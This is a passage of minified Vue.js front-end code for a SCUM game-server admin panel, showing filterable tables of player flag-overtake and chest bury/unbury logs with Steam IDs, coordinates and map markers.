e.actionsListFilter,"createdArea",t)},expression:"actionsListFilter.createdArea"}},e._l(e.gameArealList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("记录时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.actionsListFilter.timestampStart,e.actionsListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.actionsListFilter,"timestampStart",t[0]),e.$set(e.actionsListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.actionsListColumns,"data-source":e.actionsListData,expandedRowKeys:e.expandedActionsIds,"row-key":"id",pagination:!1,loading:e.loadingActionsListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedActionsIds.find((function(e){return e===i.id}))&&e.expandedActionsIds.push(i.id);else{var a=Object.keys(e.expandedActionsIds).find((function(t){return e.expandedActionsIds[t]===i.id}));void 0!==a&&e.expandedActionsIds.splice(a,1)}}},scopedSlots:e._u([{key:"action",fn:function(t,a){return[i("a-tag",{attrs:{color:void 0!==e.actionTypeList.find((function(e){return e.value===a.otherConfig.action}))?e.actionTypeList.find((function(e){return e.value===a.otherConfig.action})).color:"grey"}},[e._v(" "+e._s(void 0!==e.actionTypeList.find((function(e){return e.value===a.otherConfig.action}))?e.actionTypeList.find((function(e){return e.value===a.otherConfig.action})).label:a.otherConfig.action)+" ")])]}},{key:"steamId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"scumId",fn:function(t,a){return[i("span",[e._v(e._s(t))]),a.actionsRecordUser&&a.actionsRecordUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.actionsRecordUser.userName}})}}},[e._v("("+e._s(a.actionsRecordUser.userName)+")")]):e._e()]}},{key:"locationsArea",fn:function(t,a){return[i("span",[e._v(e._s(a.createdLocations)+"("+e._s(a.createdArea)+")")])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedActionsIds.find((function(e){return e===t.id}))?["string"==typeof t.rawText?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("日志原文")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.rawText)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.rawText.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e(),t.otherConfig&&t.otherConfig.owner&&t.otherConfig.owner.scumId?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("玩家信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("strong",{staticStyle:{color:"#1890ff"}},[e._v(e._s(t.otherConfig.owner.scumId))]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.otherConfig.owner.steamId||"无Steam ID")+")")])])]:e._e(),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("坐标信息详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),t.otherConfig&&t.otherConfig.flag&&t.otherConfig.flag.id?[i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("领地旗ID:")]),i("strong",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.otherConfig.flag.id))])]),t.otherConfig&&t.otherConfig.flag&&t.otherConfig.flag.locations&&t.otherConfig.flag.area?i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("领地旗坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.otherConfig.flag.locations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.otherConfig.flag.area)+")")])])]):e._e()]:e._e(),t.otherConfig&&t.otherConfig.flag&&t.otherConfig.flag.locations&&t.otherConfig.flag.area?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("领地旗地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.otherConfig.flag.locations}})],1)]:e._e()]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.actionsListPagination.pageSize,current:e.actionsListPagination.pageNum,total:e.actionsListPagination.total},on:{change:e.onChangeActionsListPagination,showSizeChange:e.onShowSizeChangeActionsListPagination}})],1)}),[],!1,null,"675fb77a",null),gi=mi.exports,hi={name:"BaseBuilding",components:{MapLocations:J},data:function(){return{moment:R.a,loadingActionsListTable:!1,actionsListFilter:{steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},actionsListColumns:[{title:"动作类型",key:"action",dataIndex:"action",width:100,align:"center",scopedSlots:{customRender:"action"}},{title:"摸旗人Steam ID",key:"steamId",dataIndex:"steamId",width:150,align:"center",scopedSlots:{customRender:"steamId"}},{title:"摸旗人游戏名称",key:"scumId",dataIndex:"scumId",width:180,align:"center",scopedSlots:{customRender:"scumId"}},{title:"摸旗人坐标(区域)",key:"locationsArea",dataIndex:"locationsArea",width:180,align:"center",scopedSlots:{customRender:"locationsArea"}},{title:"生成记录时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],actionsListData:[],actionsListPagination:{pageSize:20,pageNum:1,total:0},expandedActionsIds:[],gameArealList:[],actionTypeList:[{value:"overtakeStarted",label:"开始摸旗",color:"yellow"},{value:"overtakeCanceled",label:"取消摸旗",color:"yellow"},{value:"overtakeAbandoned",label:"放弃摸旗",color:"yellow"},{value:"overtaken",label:"占领",color:"red"},{value:"overtakenOther",label:"占领(离队)",color:"red"}],selectedRowKeys:[]}},mounted:function(){this.getGameAreaList(),this.getActionsList()},methods:{onActionsListCleanFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList(!0)}))},onActionsListFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList()}))},onChangeActionsListPagination:function(e){var t=this;this.actionsListPagination.pageNum=e,this.$nextTick((function(){t.getActionsList()}))},onShowSizeChangeActionsListPagination:function(e,t){var i=this;this.actionsListPagination.pageNum=1,this.actionsListPagination.pageSize=t,this.$nextTick((function(){i.getActionsList()}))},getActionsList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.actionsListPagination,n=a.pageNum,r=a.pageSize,e?(t.actionsListFilter={steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r,type:"baseBuilding"}):(void 0!==(l=Object(A.cloneDeep)(t.actionsListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r,type:"baseBuilding"},l)),t.loadingActionsListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/actionsRecordAdminSys/list",params:o});case 6:c=i.sent,t.loadingActionsListTable=!1,200===c.status&&(t.actionsListPagination.total=c.data.count,t.actionsListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingActionsListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.actionsListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawText})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))},getGameAreaList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/serverConfigAdminSys/gameAreaList"});case 3:200===(i=t.sent).status&&(e.gameArealList=i.data),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()}}},fi=hi,yi=Object(S.a)(fi,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.steamId,callback:function(t){e.$set(e.actionsListFilter,"steamId",t)},expression:"actionsListFilter.steamId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("操作者游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.scumId,callback:function(t){e.$set(e.actionsListFilter,"scumId",t)},expression:"actionsListFilter.scumId"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者所在区域:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.actionsListFilter.createdArea,callback:function(t){e.$set(e.actionsListFilter,"createdArea",t)},expression:"actionsListFilter.createdArea"}},e._l(e.gameArealList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("记录时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.actionsListFilter.timestampStart,e.actionsListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.actionsListFilter,"timestampStart",t[0]),e.$set(e.actionsListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.actionsListColumns,"data-source":e.actionsListData,expandedRowKeys:e.expandedActionsIds,"row-key":"id",pagination:!1,loading:e.loadingActionsListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedActionsIds.find((function(e){return e===i.id}))&&e.expandedActionsIds.push(i.id);else{var a=Object.keys(e.expandedActionsIds).find((function(t){return e.expandedActionsIds[t]===i.id}));void 0!==a&&e.expandedActionsIds.splice(a,1)}}},scopedSlots:e._u([{key:"action",fn:function(t,a){return[i("a-tag",{attrs:{color:void 0!==e.actionTypeList.find((function(e){return e.value===a.otherConfig.action}))?e.actionTypeList.find((function(e){return e.value===a.otherConfig.action})).color:"grey"}},[e._v(" "+e._s(void 0!==e.actionTypeList.find((function(e){return e.value===a.otherConfig.action}))?e.actionTypeList.find((function(e){return e.value===a.otherConfig.action})).label:a.otherConfig.action)+" ")])]}},{key:"steamId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"scumId",fn:function(t,a){return[i("span",[e._v(e._s(t))]),a.actionsRecordUser&&a.actionsRecordUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.actionsRecordUser.userName}})}}},[e._v("("+e._s(a.actionsRecordUser.userName)+")")]):e._e()]}},{key:"locationsArea",fn:function(t,a){return[i("span",[e._v(e._s(a.createdLocations)+"("+e._s(a.createdArea)+")")])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedActionsIds.find((function(e){return e===t.id}))?["string"==typeof t.rawText?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("日志原文")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.rawText)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.rawText.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e(),t.otherConfig&&t.otherConfig.owner&&t.otherConfig.owner.scumId?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("物主信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("strong",{staticStyle:{color:"#1890ff"}},[e._v(e._s(t.otherConfig.owner.scumId))]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.otherConfig.owner.steamId||"无Steam ID")+")")])])]:e._e(),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("坐标信息详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v(e._s(t.otherConfig&&"overtakeCanceled"===t.otherConfig.action?"领地旗":"玩家")+"坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.createdLocations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.createdArea)+")")])])]),t.otherConfig&&t.otherConfig.flag&&t.otherConfig.flag.id?[i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("领地旗ID:")]),i("strong",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.otherConfig.flag.id))])]),t.otherConfig&&t.otherConfig.flag&&t.otherConfig.flag.locations&&t.otherConfig.flag.area?i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("领地旗坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.otherConfig.flag.locations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.otherConfig.flag.area)+")")])])]):e._e()]:e._e(),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("玩家地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.createdLocations}})],1),t.otherConfig&&t.otherConfig.flag&&t.otherConfig.flag.locations&&t.otherConfig.flag.area?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("领地旗地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.otherConfig.flag.locations}})],1)]:e._e()]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.actionsListPagination.pageSize,current:e.actionsListPagination.pageNum,total:e.actionsListPagination.total},on:{change:e.onChangeActionsListPagination,showSizeChange:e.onShowSizeChangeActionsListPagination}})],1)}),[],!1,null,"0e92d593",null),vi=yi.exports,xi={name:"Chest",components:{MapLocations:J},data:function(){return{moment:R.a,loadingActionsListTable:!1,actionsListFilter:{steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},actionsListColumns:[{title:"动作类型",key:"action",dataIndex:"action",width:100,align:"center",scopedSlots:{customRender:"action"}},{title:"操作人Steam ID",key:"steamId",dataIndex:"steamId",width:150,align:"center",scopedSlots:{customRender:"steamId"}},{title:"操作人游戏名称",key:"scumId",dataIndex:"scumId",width:180,align:"center",scopedSlots:{customRender:"scumId"}},{title:"操作人坐标(区域)",key:"locationsArea",dataIndex:"locationsArea",width:180,align:"center",scopedSlots:{customRender:"locationsArea"}},{title:"生成记录时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],actionsListData:[],actionsListPagination:{pageSize:20,pageNum:1,total:0},expandedActionsIds:[],gameArealList:[],actionTypeList:[{value:"bury",label:"埋箱子",color:"green"},{value:"unbury",label:"挖箱子",color:"red"}],selectedRowKeys:[]}},mounted:function(){this.getGameAreaList(),this.getActionsList()},methods:{onActionsListCleanFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList(!0)}))},onActionsListFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList()}))},onChangeActionsListPagination:function(e){var t=this;this.actionsListPagination.pageNum=e,this.$nextTick((function(){t.getActionsList()}))},onShowSizeChangeActionsListPagination:function(e,t){var i=this;this.actionsListPagination.pageNum=1,this.actionsListPagination.pageSize=t,this.$nextTick((function(){i.getActionsList()}))},getActionsList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.actionsListPagination,n=a.pageNum,r=a.pageSize,e?(t.actionsListFilter={steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r,type:"chest"}):(void 0!==(l=Object(A.cloneDeep)(t.actionsListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r,type:"chest"},l)),t.loadingActionsListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/actionsRecordAdminSys/list",params:o});case 6:c=i.sent,t.loadingActionsListTable=!1,200===c.status&&(t.actionsListPagination.total=c.data.count,t.actionsListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingActionsListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.actionsListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawText})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))},getGameAreaList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/serverConfigAdminSys/gameAreaList"});case 3:200===(i=t.sent).status&&(e.gameArealList=i.data),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()}}},bi=xi,Si=Object(S.a)(bi,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.steamId,callback:function(t){e.$set(e.actionsListFilter,"steamId",t)},expression:"actionsListFilter.steamId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("操作者游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.scumId,callback:function(t){e.$set(e.actionsListFilter,"scumId",t)},expression:"actionsListFilter.scumId"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者所在区域:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.actionsListFilter.createdArea,callback:function(t){e.$set(e.actionsListFilter,"createdArea",t)},expression:"actionsListFilter.createdArea"}},e._l(e.gameArealList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("记录时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.actionsListFilter.timestampStart,e.actionsListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.actionsListFilter,"timestampStart",t[0]),e.$set(e.actionsListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.actionsListColumns,"data-source":e.actionsListData,expandedRowKeys:e.expandedActionsIds,"row-key":"id",pagination:!1,loading:e.loadingActionsListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedActionsIds.find((function(e){return e===i.id}))&&e.expandedActionsIds.push(i.id);else{var a=Object.keys(e.expandedActionsIds).find((function(t){return e.expandedActionsIds[t]===i.id}));void 0!==a&&e.expandedActionsIds.splice(a,1)}}},scopedSlots:e._u([{key:"action",fn:function(t,a){return[i("a-tag",{attrs:{color:void 0!==e.actionTypeList.find((function(e){return e.value===a.otherConfig.action}))?e.actionTypeList.find((function(e){return e.value===a.otherConfig.action})).color:"grey"}},[e._v(" "+e._s(void 0!==e.actionTypeList.find((function(e){return e.value===a.otherConfig.action}))?e.actionTypeList.find((function(e){return e.value===a.otherConfig.action})).label:a.otherConfig.action)+" ")])]}},{key:"steamId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"scumId",fn:function(t,a){return[i("span",[e._v(e._s(t))]),a.actionsRecordUser&&a.actionsRecordUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.actionsRecordUser.userName}})}}},[e._v("("+e._s(a.actionsRecordUser.userName)+")")]):e._e()]}},{key:"locationsArea",fn:function(t,a){return[i("span",[e._v(e._s(a.createdLocations)+"("+e._s(a.createdArea)+")")])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedActionsIds.find((function(e){return e===t.id}))?["string"==typeof t.rawText?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("日志原文")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.rawText)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 